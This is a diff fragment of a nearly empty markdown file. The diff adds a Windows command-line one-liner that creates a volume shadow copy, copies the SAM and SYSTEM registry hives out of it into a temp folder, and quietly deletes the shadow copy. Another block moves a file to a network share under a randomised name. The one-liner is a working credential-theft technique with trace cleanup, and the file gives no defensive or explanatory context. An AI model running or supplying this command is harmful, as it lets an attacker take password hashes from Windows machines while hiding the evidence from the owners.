@@ -1,6 +1,11 @@
 # a
 
+```
+cmd /c "for /f "tokens=2 delims=:" %a in ('vssadmin create shadow /for=C: ^| findstr "ID:"') do for /f "tokens=2 delims==" %i in ('wmic shadowcopy where "ID='%a'" get DeviceObject /value') do (copy "%i\windows\system32\config\SAM" \temp\SAM & copy "%i\windows\system32\config\SYSTEM" \temp\SYSTEM & vssadmin delete shadows /shadow=%a /quiet)"
 
+ 
+
+```
 ```
 move "C:\MyFolder\MyFile.txt" "\\ServerName\SharedFolder\MyFile_%RANDOM%.txt"
 
